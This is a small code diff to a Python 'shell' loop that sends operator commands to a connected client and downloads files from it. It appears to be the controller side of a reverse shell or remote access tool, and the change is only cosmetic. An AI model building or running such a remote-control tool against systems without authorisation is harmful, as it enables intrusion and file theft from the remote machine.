@@ -24,10 +24,11 @@ def shell():
         send_j(cmd) # send command to client
         if cmd == "exit_server":
             break
-        if cmd == "exit_client":
+        elif cmd == "exit_client":
             continue
         elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
             continue
+
         elif cmd[:8] == "download":
             with open(cmd[9:],"wb") as f:
                 data = recv_j()
